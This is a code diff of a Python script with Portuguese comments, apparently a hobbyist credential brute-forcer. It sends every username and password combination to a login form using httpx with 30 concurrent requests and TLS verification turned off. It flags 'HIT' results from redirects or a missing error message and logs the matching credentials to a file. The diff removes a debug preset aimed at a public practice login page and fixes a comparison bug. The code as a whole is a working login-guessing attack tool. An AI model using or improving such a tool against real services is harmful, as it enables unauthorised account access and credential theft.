@@ -1,10 +1,9 @@
 import asyncio
 import httpx
+from datetime import datetime
 
 print("digite help para mais informações!")
 
-#MODO DEV PARA TESTES
-DEBUG = True
 #------------------------------------------------
 
 #HELP
@@ -65,7 +64,7 @@ def url():
 def headers ():
     try:
         header_nav = str(input("Deseja adicionar headers?: ")).strip().lower()
-        if header_nav != "!pass" and not header_nav == ["sim", "yes", "s"]:
+        if header_nav != "!pass" and not header_nav in ["sim", "yes", "s"]:
             try:
                 print("headers adicionados!")
                 return {
@@ -227,78 +226,62 @@ mapa_config = {
 #----------------------------------------------------------------------------------------#
 #multitarefas e requisição
 
-async def testar_login(client, url, user, pwd, headers, user_field, pass_field, erro_msg):
+async def testar_login(client, url, user, pwd, headers, user_field, pass_field, erro_msg, sem):
     payload = {
     user_field: user,
     pass_field: pwd,
 }
-    if DEBUG:
-        print(f"Tentando {user}:{pwd} com payload: {payload}")
+    def log_hit(user, pwd):
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        with open("logs.txt", "a") as log:
+            log.write(f"[{timestamp}] {user}:{pwd}\n")
+        print(f"\033[92m[HIT] {user}:{pwd}\033[0m")
 
-    try:
-        response = await client.post(url, data=payload, headers=headers, timeout=10)
-        print(f"STATUS CODE → {response.status_code} para {user}:{pwd}")
+    async with sem:
+        try:
+            response = await client.post(url, data=payload, headers=headers, timeout=10)
+            print(f"STATUS CODE → {response.status_code} para {user}:{pwd}")
+            
+            if response.status_code == 302 or (erro_msg and erro_msg not in response.text):
+                print(f"\033[92m[HIT] {user}:{pwd}\033[0m")
+                log_hit(user, pwd)
+                #print(f"POSSÍVEL HIT (Redirecionamento)! Credenciais: {user}:{pwd}")
+
+            else:
+                status_msg_erro = "Presente" if erro_msg in response.text else "Ausente/Não configurada"
+                print(f"Nada encontrado para {user}:{pwd}. Mensagem de erro esperada ('{erro_msg}') status: {status_msg_erro}")
         
-        if response.status_code == 302:
-            print(f"POSSÍVEL HIT (Redirecionamento)! Credenciais: {user}:{pwd}")
-            with open("logs.txt", "a") as poss_hitfile:
-                poss_hitfile.write(f"{user}:{pwd}\n")
+        except httpx.TimeoutException:
+            print(f"ERRO: Tempo limite excedido ao testar {user}:{pwd}")
 
-        if erro_msg and erro_msg not in response.text:
-            print(f"POSSÍVEL HIT (Mensagem de erro ausente)! Credenciais: {user}:{pwd}")
-            with open("logs.txt", "a") as poss_hitfile:
-                poss_hitfile.write(f"{user}:{pwd}\n")
-        else:
-            status_msg_erro = "Presente" if erro_msg in response.text else "Ausente/Não configurada"
-            print(f"Nada encontrado para {user}:{pwd}. Mensagem de erro esperada ('{erro_msg}') status: {status_msg_erro}")
-    
-    except httpx.TimeoutException:
-        print(f"ERRO: Tempo limite excedido ao testar {user}:{pwd}")
+        except httpx.RequestError as e:
+            print(f"ERRO DE CONEXÃO/REQUISIÇÃO para {user}:{pwd}: {e}")
+            
+        except Exception as e:
+            print(f"ERRO INESPERADO ao testar {user}:{pwd}: {e}")
 
-    except httpx.RequestError as e:
-        print(f"ERRO DE CONEXÃO/REQUISIÇÃO para {user}:{pwd}: {e}")
         
-    except Exception as e:
-        print(f"ERRO INESPERADO ao testar {user}:{pwd}: {e}")
-
-    
 async def start_attack(config):
-    url = config["h_ur"]
-    user_field = config["h_usite"]
-    pass_field = config["h_psite"]
-    usernames = config["h_user"]
-    passwords = config["h_psw"]
-    headers = config["h_headers"]
-    erro_msg = config["h_emsg"]
+        url = config["h_ur"]
+        user_field = config["h_usite"]
+        pass_field = config["h_psite"]
+        usernames = config["h_user"]
+        passwords = config["h_psw"]
+        headers = config["h_headers"]
+        erro_msg = config["h_emsg"]
 
-    tasks = []
-    async with httpx.AsyncClient(follow_redirects=True, verify=False) as client:
-        for user in usernames:
-            for pwd in passwords:
-                tasks.append(
-                    testar_login(client, url, user, pwd, headers, user_field, pass_field, erro_msg)
-                )
-        await asyncio.gather(*tasks)
+        sem = asyncio.Semaphore(30) 
+        tasks = []
+        timeout = httpx.Timeout(10.0, connect=5.0)
+        async with httpx.AsyncClient(timeout=timeout, follow_redirects=True, verify=False) as client:
+            for user in usernames:
+                for pwd in passwords:
+                    tasks.append(
+                        testar_login(client, url, user, pwd, headers, user_field, pass_field, erro_msg, sem)
+                    )
+            await asyncio.gather(*tasks)
 
-#---------------------------------------------------------------
-if DEBUG:
-    config.update({
-        "h_help": "",
-        "h_headers": {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0",
-            "Content-Type": "application/x-www-form-urlencoded"
-        },
-        "h_mpost": "303",
-        "h_emsg": "SuperSecretPassword!",
-        "h_ur": "https://the-internet.herokuapp.com/login",
-        "h_door": ["443"],
-        "h_psite": "password",
-        "h_usite": "username",
-        "h_user": ["tomsmith", "test"], 
-        "h_psw": ["password", "senha123"]
-    })
-    print("🔧 MODO DEBUG ATIVADO — CONFIGS PRÉ-CARREGADOS")
-
+#-----------------------------------------------------------------
 #-----------------------------------------------------------------------
 #inicio do programa
 while True:
@@ -319,4 +302,3 @@ while True:
         print("programa iniciado!")
     elif buscar not in inicio :
         print("PADRAO INEXISTENTE")
-    
